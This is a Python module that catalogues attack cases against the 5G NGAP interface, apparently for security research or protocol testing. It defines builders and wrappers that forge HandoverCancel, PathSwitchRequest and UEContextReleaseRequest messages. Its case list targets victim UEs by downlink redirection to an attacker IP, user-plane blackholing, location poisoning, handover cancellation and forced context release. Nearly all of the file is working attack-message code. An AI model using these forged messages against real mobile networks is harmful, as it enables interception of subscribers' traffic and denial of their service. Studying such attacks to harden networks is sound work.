"""Attack-case catalog for NGAP messages p01-p04 (batch22_firstpriority).

  p01 PathSwitchRequest      -> B.path_switch_request       (exists)
  p02 UEContextReleaseRequest-> B.ue_context_release_request (exists)
  p03 HandoverRequired       -> B.handover_required          (exists)
  p04 HandoverCancel         -> handover_cancel              (NEW, this file)

Each CASE realizes one row of that message's "## 4. Candidate Attack Table".
Cases that need an IE the existing builder cannot express (PathSwitchRequest
failed-to-setup list; UEContextReleaseRequest PDU-Session list) are realized by
small local wrappers below that post-process the builder's value tuple — this
file never edits builders.py.

See docs/cases/cat_p01_p04.md for the human-readable catalog.
"""
from __future__ import annotations

from . import builders as B, ngap

CFG = {"mcc": "001", "mnc": "01", "tac": 1, "sst": 1, "sd": "010203",
       "gnb_id": 4660, "gnb_id_len": 32, "nci": 17}


# ---------------------------------------------------------------- p04 NEW builder
def handover_cancel(amf_ue_id: int, ran_ue_id: int,
                    cause=("radioNetwork", "handover-cancelled")):
    """HANDOVER CANCEL (Class 1, procedureCode 10). TS 38.413 clause 9.2.3.11.

    IEs (HandoverCancelIEs): id-AMF-UE-NGAP-ID(10, reject),
    id-RAN-UE-NGAP-ID(85, reject), id-Cause(15, ignore) — all mandatory.
    Forges a victim Source AMF-UE-NGAP-ID to cancel a legitimate in-progress
    handover for a UE served by another gNB (AMF confused-deputy: releases the
    prepared target-gNB context).
    """
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 15, "criticality": "ignore", "value": ("Cause", cause)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 10, "criticality": "reject",
        "value": ("HandoverCancel", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- local wrappers
def _append_ie(msg, ie):
    """Append one protocolIE dict to a builder's value tuple (in place-safe copy)."""
    kind, body = msg
    inner_name, inner = body["value"]
    ies = list(inner["protocolIEs"]) + [ie]
    new_body = dict(body)
    new_body["value"] = (inner_name, {"protocolIEs": ies})
    return (kind, new_body)


def path_switch_failed_list(source_amf_ue_id, ran_ue_id, cfg, *,
                            attacker_ip="127.0.0.1", teid=1,
                            failed_sessions=(2,),
                            fail_cause=("radioNetwork", "unknown-PDU-session-ID")):
    """PATH SWITCH REQUEST + id-PDUSessionResourceFailedToSetupListPSReq(57).

    Claims target-side failure for victim PDU session(s) so the AMF/SMF release or
    mark those sessions failed. The failed transfer is PathSwitchRequestSetupFailed-
    Transfer{cause}, carried as an OCTET STRING.
    """
    base = B.path_switch_request(source_amf_ue_id, ran_ue_id, cfg,
                                 attacker_ip=attacker_ip, teid=teid)
    failed_transfer = ngap.encode_transfer(
        "PathSwitchRequestSetupFailedTransfer", {"cause": fail_cause})
    failed = [{"pDUSessionID": int(pid),
               "pathSwitchRequestSetupFailedTransfer": failed_transfer}
              for pid in failed_sessions]
    ie = {"id": 57, "criticality": "ignore",
          "value": ("PDUSessionResourceFailedToSetupListPSReq", failed)}
    return _append_ie(base, ie)


def ue_ctx_release_with_pdu_list(amf_ue_id, ran_ue_id, *,
                                 pdu_sessions=(1,),
                                 cause=("radioNetwork", "user-inactivity")):
    """UE CONTEXT RELEASE REQUEST + id-PDUSessionResourceListCxtRelReq(133).

    Names specific victim PDU Session IDs so the AMF/SMF can be steered toward
    per-session deactivation (user-plane blackhole / selective disruption).
    """
    base = B.ue_context_release_request(amf_ue_id, ran_ue_id, cause=cause)
    lst = [{"pDUSessionID": int(pid)} for pid in pdu_sessions]
    ie = {"id": 133, "criticality": "reject",
          "value": ("PDUSessionResourceListCxtRelReq", lst)}
    return _append_ie(base, ie)


# ---------------------------------------------------------------- CASES
# Victim identifiers used throughout: source AMF-UE-NGAP-ID = 1, victim RAN side
# varies. Attacker-local RAN-UE-NGAP-ID values are chosen stable/recognisable.
CASES = [
    # ---- p01 PathSwitchRequest (procCode 25) --------------------------------
    {"id": "p01-a", "msg": "PathSwitchRequest",
     "desc": "Victim downlink N3 redirection (reachable attacker TNL)",
     "build": lambda cfg: B.path_switch_request(1, 99, cfg,
                                                attacker_ip="172.30.200.9", teid=0x11111111)},
    {"id": "p01-b", "msg": "PathSwitchRequest",
     "desc": "Remote UE downlink blackhole (dead/unroutable TNL)",
     "build": lambda cfg: B.path_switch_request(1, 99, cfg,
                                                attacker_ip="10.255.255.255", teid=0xdeadbeef)},
    {"id": "p01-c", "msg": "PathSwitchRequest",
     "desc": "UE context serving-node misbinding (stable attacker-local RAN-UE-NGAP-ID)",
     "build": lambda cfg: B.path_switch_request(1, 0x41414141, cfg,
                                                attacker_ip="172.30.200.9", teid=0x22222222)},
    {"id": "p01-d", "msg": "PathSwitchRequest",
     "desc": "PDU session / QoS-flow failure injection (Failed-to-Setup list PSReq)",
     "build": lambda cfg: path_switch_failed_list(1, 99, cfg,
                                                  attacker_ip="172.30.200.9", teid=0x11111111,
                                                  failed_sessions=(2,))},
    {"id": "p01-f", "msg": "PathSwitchRequest",
     "desc": "Remote UE location poisoning (forged ULI: claimed NR-CGI/TAI)",
     "build": lambda cfg: B.path_switch_request(1, 99, cfg,
                                                attacker_ip="172.30.200.9", teid=0x11111111,
                                                nci=0x999)},

    # ---- p02 UEContextReleaseRequest (procCode 42) --------------------------
    {"id": "p02-a", "msg": "UEContextReleaseRequest",
     "desc": "Single-message remote UE context release",
     "build": lambda cfg: B.ue_context_release_request(
         1, 99, cause=("radioNetwork", "user-inactivity"))},
    {"id": "p02-b", "msg": "UEContextReleaseRequest",
     "desc": "User-plane path deactivation / blackholing (with PDU-Session list)",
     "build": lambda cfg: ue_ctx_release_with_pdu_list(
         1, 99, pdu_sessions=(1,), cause=("radioNetwork", "radio-connection-with-ue-lost"))},
    # ---- p03 HandoverRequired (procCode 12) ---------------------------------
    {"id": "p03-a", "msg": "HandoverRequired",
     "desc": "Legitimate target gNB resource reservation",
     "build": lambda cfg: B.handover_required(1, 99, cfg, target_gnb_id=0x2000)},
    {"id": "p03-b", "msg": "HandoverRequired",
     "desc": "Victim UE handover-state desynchronization",
     "build": lambda cfg: B.handover_required(
         1, 99, cfg, target_gnb_id=0x2000,
         cause=("radioNetwork", "time-critical-handover"))},
    {"id": "p03-d", "msg": "HandoverRequired",
     "desc": "User-plane blackhole/redirect via attacker-controlled target gNB",
     "build": lambda cfg: B.handover_required(
         1, 99, cfg, target_gnb_id=int(cfg["gnb_id"]))},
    # ---- p04 HandoverCancel (procCode 10, NEW builder) ----------------------
    {"id": "p04-a", "msg": "HandoverCancel",
     "desc": "Cross-gNB cancellation of an active remote handover",
     "build": lambda cfg: handover_cancel(
         1, 99, cause=("radioNetwork", "handover-cancelled"))},
]
